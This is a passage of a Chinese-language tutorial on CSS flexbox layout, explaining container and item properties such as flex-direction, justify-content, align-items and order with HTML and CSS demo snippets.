3px;}\n    article { width: 600px; }\n    article:nth-of-type(odd) { width: 300px; }\n    div > div {\n      outline: 1px solid; margin: 3px; line-height: 1.5;\n      min-height: 40px; text-align: center;\n    }\n    article.flex3 > div > div { flex: 3; }\n    p { text-align: left; padding-left: 100px; }\n    </style>\n</head>\n<body>\n  <article class="flex3">\n    <p>flex: 3;</p>\n    <div>\n      <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div><div>E E E E E</div>\n      <div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article class="flex3">\n    <p>flex: 3;</p>\n    <div>\n      <div>A</div><div>B B</div><div>C C C</div><div>D D D D</div><div>E E E E E</div>\n      <div>F F F F</div><div>G G G</div><div>H H</div><div>I</div>\n    </div>\n  </article>\n  <article>\n    <p>flex: 0 - 5;</p>\n    <div>\n      <div style="flex: 0"></div><div style="flex: 1"></div>\n      <div style="flex: 2"></div><div style="flex: 3"></div>\n      <div style="flex: 4"></div><div style="flex: 5"></div>\n    </div>\n  </article>\n  <article></article>\n  <article>\n    <p>flex: 0 - 5;</p>\n    <div>\n      <div style="flex: 0">flex: 0</div><div style="flex: 1">flex: 1</div>\n      <div style="flex: 2">flex: 2</div><div style="flex: 3">flex: 3</div>\n      <div style="flex: 4">flex: 4</div><div style="flex: 5">flex: 5</div>\n    </div>\n  </article>\n  <article>\n    <p>flex: 0 - 5;</p>\n    <div>\n      <div style="flex: 0">flex: 0</div><div style="flex: 1">flex: 1</div>\n      <div style="flex: 2">flex: 2</div><div style="flex: 3">flex: 3</div>\n      <div style="flex: 4">flex: 4</div><div style="flex: 5">flex: 5</div>\n    </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n以上代码效果图：\n\n\n\n# 3.6 align-self\n\nalign-self属性设置在flex项上，用于屏蔽覆盖flex容器的align-items对flex项的影响。align-self具有align-items所有的属性值flex-start | flex-end | center | baseline | stretch，并且还单独有个auto值表示继承flex容器当前align-items的值。\n\n\n# 3.7 order\n\norder属性设置在flex项上，用于更改flex项的顺序。\n\n默认情况下，所有flex项均被分配为“0”的顺序。flex项的order为负值时，将会显示在默认值“0”之前；flex项的order为正值时，将会显示在默认值“0”之后。如果一些flex项的order相同，则按照源顺序显示。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer { display: flex; width: 300px; border: 1px dashed; }\n    .outer div {\n      width: 50px; height: 80px; box-sizing: border-box;\n      text-align: center; margin: 5px; padding: 25px 5px;\n      border: 1px solid; background-color: rgba(0,0,0,0.1);\n    }\n    .inner2 { order: -1; }\n    .inner3 { order: -2; }\n    .inner4 { order: 1; }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner1">1</div>\n        <div class="inner2">2</div>\n        <div class="inner3">3</div>\n        <div class="inner4">4</div>\n        <div class="inner5">5</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n以上代码效果图：\n',normalizedContent:'# 弹性盒布局\n\n\n# 一、弹性盒简介\n\n弹性盒(flexbox)布局是一种用于按行或按列布局元素的一维布局方法。元素可以膨胀以填充额外的空间，收缩以适应更小的空间，也就说这种布局可以适应不同屏幕尺寸或不同设备。\n\n通过声明display: flex或display: inline-flex在元素上激活flexbox布局。该元素会作为一个flex容器，控制内部的子元素（flex项）进行布局。这里需要说明的一点，是flex容器的直接子元素作为flex项，其他后代还是正常展示和布局。\n\n在flex容器中，flex项就可以在主轴上排列，主轴可以是垂直或者水平，也就是说按照行或列来排列。然后可以让flex项居左、居中或居右来显示，当然也可以分散开来。有对应的属性处理flex项填不满时对出的的空间，也有对应的属性处理flex项占用过多空间时flex项应该要怎么调整。\n\n弹性盒布局可以解决的哪些问题？之前的圣杯布局，就使用了浮动让几个div形成列，再用负值外边距来让左右两列上移。还有等分布局，也要使用负值外边距来处理多出的空白间隙。还有等高布局，就使用了padding-bottom: 9999px;和margin-bottom: -9999px;这种奇怪样式。对于不太精通盒模型的人来说，真是丈二和尚摸不着头脑，那么弹性盒布局就可以解决这些问题。\n\n\n# 二、flex容器\n\nflex容器是一个“容器”，换句话说，它是一个“格式上下文”。在bfc就提到过这个概念，它是页面中一个独立的渲染区域，拥有自己的渲染规则，会隔离内部元素与外部元素。\n\n了解完“容器”后，我们去学习关于flex容器的一些设置，学习怎么控制内部元素。\n\n\n# 2.1 主轴和交叉轴\n\n后面会经常提到“主轴”和“交叉轴”，让我们来看一下它们到底是什么。\n\n\n\n * 主轴（main axis）是沿着 flex 元素放置的方向延伸的轴。该轴的开始和结束被称为main start和main end。\n * 交叉轴（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为cross start和cross end。\n * main size是内容沿主轴的长度，cross size是内容沿交叉轴的长度。\n\n\n# 2.2 flex-direction\n\nflex-direction是用来控制flex容器的主轴是水平还是垂直方向的。它的值有row（默认值）、row-reverse、column、column-reverse，在“自左到右”的语言下（比如英文中文），它们分别表示的“从左到右”、“从右到左”、“从上到下”以及“从下到上”的排列顺序。\n\n准确来说，row应该是当前书写模式下内联元素排列的方向（row-reverse就是内联排列反方向），column是当前书写模式下块级元素排列的方向（column-reverse就是块级排列反方向）。比如日语是垂直的书写模式，那么row是垂直方向，而column对应的是水平方向了。\n\n至于书写模式的调整，一般与writing-mode、text-orientation、direction以及html的dir有关，可以看一下之前的章节——书写模式。\n\n<html>\n<head>\n    <style contenteditable="">\n    div { background-color: rgba(0,0,0,0.1); }\n    article > div { display: flex; border: 1px dashed; padding: 10px; }\n    p { text-align: center; }\n    div > div {\n        border: 1px solid;\n        height: 35px;\n        padding: 0 5px;\n        margin: 10px;\n        line-height: 40px;\n        text-align: center;\n        flex: 1 1 auto;\n    }\n    article:nth-of-type(3) { width: 45%; float: left; }\n    article:nth-of-type(4) { width: 45%; float: right; }\n    div > div:nth-of-type(2) { background-color: rgba(0,0,0,0.2); }\n    div > div:nth-of-type(3) { background-color: rgba(0,0,0,0.3); }\n    div > div:nth-of-type(4) { background-color: rgba(0,0,0,0.4); }\n    div > div:nth-of-type(5) { background-color: rgba(0,0,0,0.5); }\n    </style>\n</head>\n<body>\n    <article>\n      <p>flex-direction: row;</p>\n      <div style="flex-direction: row;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n    <article>\n      <p>flex-direction: row-reverse;</p>\n      <div style="flex-direction: row-reverse;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n    <article>\n      <p>flex-direction: column;</p>\n      <div style="flex-direction: column;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n    <article>\n      <p>flex-direction: column-reverse;</p>\n      <div style="flex-direction: column-reverse;">\n        <div>1</div><div>2</div><div>3</div><div>4</div><div>5</div>\n      </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n代码效果图：\n\n\n\n# 2.3 flex-wrap\n\n如果flex项不能全部放入flex容器的主轴上，默认情况下flex项不会换行，flex项会溢出或者调整大小。flex-wrap属性就可以让放不下的flex项进行换行，它的值有nowrap（默认值）、wrap、wrap-reverse。其中wrap是向交叉轴正方向进行换行，wrap-reverse是向交叉轴反方向进行换行。\n\n要特别提一点，放不放得下是考虑的是布局尺寸，这跟浮动上跳是一样的基本规则。还有另外一点，flex项不换行，flex项不见得是溢出，可能是调整大小，可以看flex-shrink这节。\n\n<html>\n<head>\n    <style>\n    article { width: 450px; }\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    article > div { display: flex; border: 1px dashed; padding: 10px; }\n    div > div { border: 1px solid; margin: 10px; padding: 0.5em 1em; text-align: center; }\n    p { text-align: center; }\n    </style>\n</head>\n<body>\n    <article>\n        <p>flex-wrap: nowrap;</p>\n        <div style="flex-wrap: nowrap">\n          <div>a</div><div>bb</div><div>ccc</div><div>dddd</div><div>eee<br>ee</div>\n          <div>fff<br>fff</div><div>gggg<br>gggg</div><div>hhh<br>hhh<br>hhh</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-wrap: wrap;</p>\n        <div style="flex-wrap: wrap">\n          <div>a</div><div>bb</div><div>ccc</div><div>dddd</div><div>eee<br>ee</div>\n          <div>fff<br>fff</div><div>gggg<br>gggg</div><div>hhh<br>hhh<br>hhh</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-wrap: wrap-reverse;</p>\n        <div style="flex-wrap: wrap-reverse">\n          <div>a</div><div>bb</div><div>ccc</div><div>dddd</div><div>eee<br>ee</div>\n          <div>fff<br>fff</div><div>gggg<br>gggg</div><div>hhh<br>hhh<br>hhh</div>\n        </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n以上代码效果图：\n\n\n\n# 2.4 flex-flow\n\nflex-flow属性其实就是flex-direction和flex-wrap的合并写法，比如flex-flow: row wrap、flex-flow: wrap column。我们强烈建议使用该属性替代那两种属性。\n\n<html>\n<head>\n    <style>\n    /* 为了让article的height: 70%生效 */\n    body, html { height: 100%; margin: 0; }\n    article { float: left; width: 30%; margin: 0 1.5%; height: 60%; }\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    article > div { display: flex; height: 95%; border: 1px dashed; padding: 10px; }\n    div > div { border: 1px solid; margin: 10px; padding: 0.5em; text-align: center; }\n    p { text-align: center; }\n    </style>\n</head>\n<body>\n    <article>\n        <p>flex-flow: column nowrap;</p>\n        <div style="flex-flow: column nowrap">\n          <div>a</div><div>bb</div><div>ccc</div><div>dddd</div><div>eee<br>ee</div>\n          <div>fff<br>fff</div><div>gggg<br>gggg</div><div>hhh<br>hhh<br>hhh</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-flow: column wrap;</p>\n        <div style="flex-flow: column wrap">\n          <div>a</div><div>bb</div><div>ccc</div><div>dddd</div><div>eee<br>ee</div>\n          <div>fff<br>fff</div><div>gggg<br>gggg</div><div>hhh<br>hhh<br>hhh</div>\n        </div>\n    </article>\n    <article>\n        <p>flex-flow: column wrap-reverse;</p>\n        <div style="flex-flow: column wrap-reverse">\n          <div>a</div><div>bb</div><div>ccc</div><div>dddd</div><div>eee<br>ee</div>\n          <div>fff<br>fff</div><div>gggg<br>gggg</div><div>hhh<br>hhh<br>hhh</div>\n        </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n以上代码效果图：\n\n\n\n# 2.5 justify-content\n\njustify-content属性设置在flex容器上，用于决定flex项在主轴上的对齐方式。它的值有flex-start | flex-end | center | space-between | space-around | space-evenly。\n\n * flex-start：默认值，让所有flex项进行主轴start方向对齐，也就是让剩余空间全部放到主轴end方向。\n * flex-end：让所有flex项进行主轴end方向对齐，也就是让剩余空间全部放到主轴start方向。\n * center：让所有flex项在主轴中间对齐，也就是让剩余空间放到主轴两边，flex项之间不留空隙。\n * space-between：flex项之间的空间会相同，第一个flex项与start之间不留空隙，最后一个flex项与end之间不留空隙。\n * space-around：flex项之间的空间会相同，第一个flex项与start有空隙而其数值是flex项之间空隙的一半，最后一个flex项与end有空隙而其数值是flex项之间空隙的一半。\n * space-evenly：flex项之间的空间会相同，第一个flex项与start有空隙而其数值就等于flex项之间的空隙，最后一个flex项与end有空隙而其数值就等于flex项之间的空隙。\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    article { margin: 15px auto; }\n    article > div { display: flex; border: 1px dashed; }\n    div > div { border: 1px solid; height: 30px; margin: 5px; padding: 5px; line-height: 30px; text-align: center; }\n    p { text-align: center; margin-bottom: 3px; }\n    </style>\n</head>\n<body>\n<article>\n  <p>justify-content: flex-start; </p>\n  <div style="justify-content: flex-start;">\n    <div>a</div>\n    <div>bbb</div>\n    <div>cccccc</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: flex-end;</p>\n  <div style="justify-content: flex-end;">\n    <div>a</div>\n    <div>bbb</div>\n    <div>cccccc</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: center;</p>\n  <div style="justify-content: center;">\n    <div>a</div>\n    <div>bbb</div>\n    <div>cccccc</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: space-between;</p>\n  <div style="justify-content: space-between;">\n    <div>a</div>\n    <div>bbb</div>\n    <div>cccccc</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: space-around;</p>\n  <div style="justify-content: space-around;">\n    <div>a</div>\n    <div>bbb</div>\n    <div>cccccc</div>\n  </div>\n</article>\n<article>\n  <p>justify-content: space-evenly;</p>\n  <div style="justify-content: space-evenly;">\n    <div>a</div>\n    <div>bbb</div>\n    <div>cccccc</div>\n  </div>\n</article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n以上代码效果图：\n\n\n如果主轴上没有剩余空间，使用justify-content，溢出会是个什么情况？换行又会是个什么情况？\n\n 1. justify-content：flex-start就是默认情况，它的溢出表现还有换行表现也是默认情况就不赘述了。\n\n 2. justify-content：flex-end让元素在end端对齐，但是元素的顺序是从start到end，那么溢出表现就是start这一端溢出了；换行表现的话与上一行一样，在end端对齐。可以看下面的示意图。\n    \n    \n\n 3. justify-content：center让元素在中间对齐，元素的顺序是从start到end，那么溢出表现应该是start和end两端都会溢出；换行表现的话与上一行一样，在中间对齐。可以看下面的示意图。\n    \n    \n\n 4. justify-content：space-between让首尾元素紧挨着start和end，空间平分。感觉溢出从哪端都一样，其实就是采用的默认溢出也就是end这一端溢出；换行表现的话与上一行一样，让首尾元素紧挨着start和end，空间平分。可以看下面的示意图。\n    \n    \n\n 5. justify-content：space-around像是center对齐，只不过让剩余空间分布在了flex之间，最后靠近start和end的空间只有一半大小。溢出与center情况一样，也就是从start和end两端溢出的；换行表现的话与上一行一样，flex项之间空间相同，靠近start和end的空间只有flex项之间空间一半大小。可以看下面的示意图。\n    \n    \n\n 6. justify-content：space-evenly也像是center对齐，只不过让剩余空间分布在了flex之间，最后靠近start和end的空间也与flex项之间空间相等。溢出与center情况一样，也就是从start和end两端溢出的；换行表现的话与上一行一样，flex项之间空间相同，靠近start和end的空间与flex项之间空间相等。可以看下面的示意图。\n    \n    \n\n\n# 2.6 等分布局改造\n\n在上一章的等分布局是使用浮动实现的，会有空白间隔问题，虽然可以使用外边距来解决，然后为了让空白间隔与每列进行关联，还使用了稍微复杂点的计算。如果我们使用弹性盒布局，再配合justify-content属性控制剩余空间，就可以很好的解决这些问题。\n\n<html>\n<head>\n    <style type="text/css">\n    /* 少一个空隙的话可以将space-evenly换成space-between */\n    .parent { display: flex; justify-content: space-evenly; border: 1px solid red; width: 500px; }\n    .parent > div { width: 20%; height: 100px; }\n    .parent > div:nth-of-type(1) { background-color: red; }\n    .parent > div:nth-of-type(2) { background-color: yellow; }\n    .parent > div:nth-of-type(3) { background-color: blue; }\n    .parent > div:nth-of-type(4) { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col"></div>\n        <div class="col"></div>\n        <div class="col"></div>\n        <div class="col"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 2.7 align-items\n\nalign-items设置在flex容器上，用于决定一行中的flex项在交叉轴上的对齐方式。它的值有flex-start | flex-end | center | baseline | stretch。\n\n与内联元素在垂直方向的对齐方式很像，align-items会控制一行中高低不齐的flex项进行某种“垂直”方向的对齐。\n\n * flex-start：让flex项与交叉轴的start对齐。flex-direction: row的话，就是顶部对齐，是布局尺寸顶部。\n * flex-end：让flex项与交叉轴的end对齐。flex-direction: row的话，就是底部对齐，是布局尺寸底部。\n * center：让flex项的中心与交叉轴长度的中点对齐。注意是布局尺寸交叉轴方向上的中心点，也就是要算margin（即使负值）。\n * baseline：让flex项的baseline与这一行的baseline对齐。\n * stretch：默认值，让可拉伸的flex项进行拉伸，拉伸到与这一行高度最大的flex项一样的高度。拉伸的参考者和被拉伸者，都作用于布局尺寸的。\n\n<html>\n<head>\n    <style>\n    article { width: 500px; display: flow-root; margin: 10px;}\n    div { background-color: rgba(0,0,0,0.1); font-family: monospace; }\n    p { float: left; text-align: center; width: 200px; height: 100px; line-height: 100px; margin: 0px; }\n    article > div { float: left; display: flex; flex-flow: row nowrap; border: 1px dashed; padding: 10px; }\n    div > div { border: 1px solid; margin: 5px 10px; padding: 0.5em; text-align: center; }\n    </style>\n</head>\n<body>\n    <article>\n        <p>align-items: flex-start;</p>\n        <div style="align-items: flex-start;">\n          <div>one</div><div>two<br>two</div><div>three<br>three<br>three</div>\n          <div>four<br>four<br>four<br>four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: flex-end;</p>\n        <div style="align-items: flex-end;">\n          <div>one</div><div>two<br>two</div><div>three<br>three<br>three</div>\n          <div>four<br>four<br>four<br>four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: center;</p>\n        <div style="align-items: center;">\n          <div>one</div><div>two<br>two</div><div>three<br>three<br>three</div>\n          <div>four<br>four<br>four<br>four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: stretch;</p>\n        <div style="align-items: stretch;">\n          <div>one</div><div>two<br>two</div><div>three<br>three<br>three</div>\n          <div>four<br>four<br>four<br>four</div>\n        </div>\n    </article>\n    <article>\n        <p>align-items: baseline;</p>\n        <div style="align-items: baseline;">\n          <div>one</div><div>two<br>two</div><div>three<br>three<br>three</div>\n          <div>four<br>four<br>four<br>four</div>\n        </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n以上代码效果图：\n\n\nalign-items: flex-start、align-items: flex-end以及align-items: center都还挺简单的。\n\nalign-items: stretch是有拉伸有限制的，设置height是不能拉伸了，设置max-heigh时拉伸不能超过这个高度。其他的压缩也类似的限制。然后需要注意的是，被作为拉伸参考对象的flex项以及被拉伸的flex项，它们都是拿布局尺寸来说的，并不是把border框拉伸到一样高度。\n\nalign-items: baseline和内联排列中的baseline不是很相同。因为确定flex项的baseline时，是考虑flex项内部第一行文本的baseline位置的（内联排列一般是最后一行），当然，如果flex项内部没有内容，那flex项的baseline是flex项的margin-bottom位置（受flex-direction影响）。然后再去确定flex容器这一行的baseline，所有flex项baseline距离这行顶部最远的，会作为这一行最终的baseline。\n\n<html>\n<head>\n    <style>\n    div { background-color: rgba(0,0,0,0.1); }\n    article { position: relative; width: 350px; }\n    article > div { display: flex; flex-flow: row wrap; border: 1px dashed; }\n    article > div > div { border: 1px solid; margin: 0 10px; text-align: center; }\n    .c, .h {  margin-top: 10px; }\n    .d, .i { margin-top: 20px; }\n    .j { font-size: 3rem; }\n    p { text-align: center; }\n    .f:after, .j:after {\n        content: \'\';\n        position: absolute;\n        left: 0;\n        right: 0;\n        border-top: 1px solid green;\n    }\n    .f:after{ top: 4.72em; }\n    .j:after{ top: 4.95em; }\n    </style>\n</head>\n<body>\n    <article>\n    <p>align-items: baseline;</p>\n    <div style="align-items: baseline;">\n      <div class="a">a</div><div class="b">bb<br>bb</div><div class="c">ccc<br>ccc<br>ccc</div>\n      <div class="d">dddd<br>dddd<br>dddd<br>dddd</div><div class="e">eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n      <div class="f">ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n      <div class="g">ggggg<br>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div class="h">hhhh<br>hhhh<br>hhhh<br>hhhh</div>\n      <div class="i">iii<br>iii<br>iii</div><div class="j">jj<br>jj</div>\n    </div>\n    </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n以上代码效果图：\n\n\n\n# 2.8 align-content\n\n上一小节的align-items是让一行里的flex项在交叉轴方向上进行对齐，而这一小节要说的是align-content，让flex容器中所有行在交叉轴方向上进行对齐。\n\n也就是说align-content是支持多行的，不支持flex-wrap: nowrap。它的取值flex-start | flex-end | center | space-between | space-around | space-evenly | stretch。\n\n * flex-start：让所有行与交叉轴start进行对齐，也就是让剩余空间全部放到交叉轴end方向。\n * flex-end：让所有行与交叉轴end进行对齐，也就是让剩余空间全部放到主轴start方向。\n * center：让所有行在交叉轴中间对齐，也就是让剩余空间放到交叉轴两边，行与行之间不留空隙。\n * space-between：行与行之间的空间会相同，第一行与start之间不留空隙，最后一行与end之间不留空隙。\n * space-around：行与行之间的空间会相同，第一行与start有空隙而其数值是行与行之间空隙的一半，最后一行与end有空隙而其数值是行与行之间空隙的一半。\n * space-evenly：行与行之间的空间会相同，第一行与start有空隙而其数值就等于行与行之间的空隙，最后一行与end有空隙而其数值就等于行与行之间的空隙。\n * stretch：默认值，行与行之间没有空隙（与start和end也没有），会将剩余空间平分给每行（行内），让它们形成一种拉伸的效果。\n\n<html>\n<head>\n  <style>\n  body { font-size: 12px; text-align: center; }\n  article { float: left; width: 250px; margin-left: 20px; margin-bottom: 10px; }\n  article > div { display: flex; flex-direction: row; align-items: stretch;\n    flex-wrap: wrap; border: 1px dashed; height: 280px;\n    background-image:\n      repeating-linear-gradient(to bottom, white 0px, white 5px, rgba(0,0,0,0.075) 5px, rgba(0,0,0,0.075) 10px);\n  }\n  div { background-color: rgba(0,0,0,0.1); }\n  div > div { border: 1px solid; flex: 1 0 auto; background-color: rgb(208,208,208); letter-spacing: 2px; }\n  .k { flex: 1 0 95%; }\n  p { margin: 0; }\n  </style>\n</head>\n<body>\n  <article>\n  <p>align-content: stretch;</p>\n  <div style="align-content: stretch;">\n    <div>a</div><div>bb<br>bb</div><div>ccc<br>ccc<br>ccc</div>\n    <div>dddd<br>dddd<br>dddd<br>dddd</div><div>eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n    <div>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n    <div>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div>hhhh<br>hhhh<br>hhhh</div>\n    <div>iii<br>iii</div><div>jj</div><div class="k">k</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content: flex-start</p>\n  <div style="align-content: flex-start">\n    <div>a</div><div>bb<br>bb</div><div>ccc<br>ccc<br>ccc</div>\n    <div>dddd<br>dddd<br>dddd<br>dddd</div><div>eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n    <div>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n    <div>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div>hhhh<br>hhhh<br>hhhh</div>\n    <div>iii<br>iii</div><div>jj</div><div class="k">k</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content: flex-end</p>\n  <div style="align-content: flex-end">\n    <div>a</div><div>bb<br>bb</div><div>ccc<br>ccc<br>ccc</div>\n    <div>dddd<br>dddd<br>dddd<br>dddd</div><div>eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n    <div>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n    <div>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div>hhhh<br>hhhh<br>hhhh</div>\n    <div>iii<br>iii</div><div>jj</div><div class="k">k</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content: center;</p>\n  <div style="align-content: center">\n    <div>a</div><div>bb<br>bb</div><div>ccc<br>ccc<br>ccc</div>\n    <div>dddd<br>dddd<br>dddd<br>dddd</div><div>eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n    <div>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n    <div>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div>hhhh<br>hhhh<br>hhhh</div>\n    <div>iii<br>iii</div><div>jj</div><div class="k">k</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content:  space-between;</p>\n  <div style="align-content: space-between;">\n    <div>a</div><div>bb<br>bb</div><div>ccc<br>ccc<br>ccc</div>\n    <div>dddd<br>dddd<br>dddd<br>dddd</div><div>eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n    <div>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n    <div>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div>hhhh<br>hhhh<br>hhhh</div>\n    <div>iii<br>iii</div><div>jj</div><div class="k">k</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content:  space-around;</p>\n  <div style="align-content: space-around;">\n    <div>a</div><div>bb<br>bb</div><div>ccc<br>ccc<br>ccc</div>\n    <div>dddd<br>dddd<br>dddd<br>dddd</div><div>eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n    <div>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n    <div>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div>hhhh<br>hhhh<br>hhhh</div>\n    <div>iii<br>iii</div><div>jj</div><div class="k">k</div>\n  </div>\n  </article>\n  <article>\n  <p>align-content:  space-evenly;</p>\n  <div style="align-content: space-evenly;">\n    <div>a</div><div>bb<br>bb</div><div>ccc<br>ccc<br>ccc</div>\n    <div>dddd<br>dddd<br>dddd<br>dddd</div><div>eeeee<br>eeeee<br>eeeee<br>eeeee<br>eeeee</div>\n    <div>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff<br>ffffff</div>\n    <div>ggggg<br>ggggg<br>ggggg<br>ggggg</div><div>hhhh<br>hhhh<br>hhhh</div>\n    <div>iii<br>iii</div><div>jj</div><div class="k">k</div>\n  </div>\n  </article>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n\n\n以上代码效果图：\n\n\n然后溢出的话与justify-content基本类似，align-content: start、align-content: space-between以及align-content: stretch都是在end端溢出，align-content: center、align-content: space-around以及align-content: space-evenly是两端溢出，align-content: end是start端溢出。\n\n\n# 三、flex项\n\nflex容器的直接子元素作为flex项，就算直接子元素是文本也会作为一个匿名flex项，直接子元素使用:: before或:: after生成的元素也算作flex项。\n\n\n# 3.1 flex项上的无效设置\n\n 1. 对flex项使用float和clear是没有效果的，会忽略这两个设置。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        .parent > div { width: 100px; height: 100px; }\n        .parent > div:nth-of-type(1) { background-color: red; }\n        .parent > div:nth-of-type(2) { float: right; background-color: yellow; }\n        .parent > div:nth-of-type(3) { background-color: blue; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n          <div class="col"></div>\n          <div class="col"></div>\n          <div class="col"></div>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n 2. 内联级别的flex项会被“块状化”，也就是可以显示设置宽高，与其他的flex项没有什么差别。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .parent { display: flex; border: 1px solid red; width: 500px; }\n        span { border: 1px solid green; width: 85px; height: 85px; }\n        .div { width: 100px; height: 100px; border: 1px solid blue; margin: 10px; }\n        a { border: 1px solid green; width: 30px; height: 30px; }\n        </style>\n    </head>\n    <body>\n        <div class="parent">\n            <span>this is text.</span>\n            <div class="div"></div>\n            <a>link</a>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 3. 